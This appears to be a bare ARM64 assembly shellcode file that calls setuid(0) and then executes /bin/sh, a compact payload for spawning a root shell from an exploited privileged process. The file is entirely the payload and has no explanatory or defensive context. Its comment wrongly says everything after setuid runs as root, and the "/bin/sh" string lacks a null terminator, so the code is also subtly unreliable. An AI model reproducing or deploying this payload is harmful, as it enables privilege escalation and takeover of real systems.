.text

.global _start
_start:
    // setuid(0)
    mov    x0, xzr
    mov    x8, #146
    svc    #0            // all instructions after this point run as UID=0 (root)

    // execve("/bin/sh", NULL, NULL)
    adrp   x0, cmd
    add    x0, x0, :lo12:cmd
    mov    x1, xzr              // argv = NULL
    mov    x2, xzr              // envp = NULL
    mov    x8, #221
    svc    #0

    // exit(0)
    mov    x0, xzr
    mov    x8, #93
    svc    #0


.section .rodata

cmd:
    .ascii    "/bin/sh"
